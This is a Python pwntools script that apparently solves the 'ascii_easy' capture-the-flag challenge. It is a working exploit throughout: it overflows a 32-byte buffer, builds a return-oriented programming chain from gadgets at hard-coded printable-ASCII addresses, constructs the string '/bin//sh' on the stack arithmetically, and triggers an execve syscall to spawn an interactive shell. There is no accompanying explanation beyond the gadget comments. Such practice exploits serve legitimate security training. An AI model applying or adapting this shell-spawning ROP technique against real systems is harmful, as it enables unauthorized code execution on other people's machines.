#coding=utf-8
from pwn import *

context.binary = './ascii_easy'

# inc edx ; xor eax, eax ; ret 
xor_eax_eax = p32(0x55642d7a)

# nop ; xor eax, eax ; ret 
xor_eax_eax = p32(0x555d203f)

# push eax ; ret
push_eax = p32(0x55687926)

# push esp ; xor eax, eax ; pop ebx ; ret
mov_ebx_esp = p32(0x55643027)

# push ebx ; add cl, byte ptr [edx] ; ret
push_ebx = p32(0x556e5f71)

# pop ecx ; add al, 0xa ; ret 
mov_ecx_esp = p32(0x556d2a51)

# inc eax ; push es ; pop edi ; ret
inc_eax = p32(0x556a7036)

# inc esi ; int 0x80
int_0x80 = p32(0x55667176)

# mov edx, dword ptr [esp] ; ret
mov_edx_0 = p32(0x55687d7b)

# inc edx ; xor eax, eax ; ret
inc_edx = p32(0x55642d7a)

# imul eax, edx ; ret
imul_eax_edx = p32(0x55605b43)

# inc ebx ; or eax, dword ptr [edx] ; out 0xa, al ; ret 
inc_ebx = p32(0x556e683f)

payload = 'a' * 32

# xor    eax,eax
# push   eax
payload += xor_eax_eax + push_eax

# push   0x68732f2f
payload += mov_edx_0 + inc_edx * 2
for i in bin(0x68732f2f)[2:]:
    if i == '1':
        payload += imul_eax_edx + inc_eax
    else:
        payload += imul_eax_edx
payload += push_eax

# push   0x6e69622f
payload += xor_eax_eax
for i in bin(0x6e69622f)[2:]:
    if i == '1':
        payload += imul_eax_edx + inc_eax
    else:
        payload += imul_eax_edx
payload += push_eax

# mov    ebx,esp
# push   eax
# push   ebx
# mov    ecx,esp
# mov    al,0xb
# int    0x80
payload += mov_ebx_esp + push_eax + push_ebx + mov_ebx_esp + push_ebx + mov_ecx_esp + inc_ebx * 8 + xor_eax_eax + inc_eax * 0xb + int_0x80

log.info(payload)
p = process(argv = ['./ascii_easy', payload])
#raw_input('debug')
#gdb.attach(p)

p.interactive()
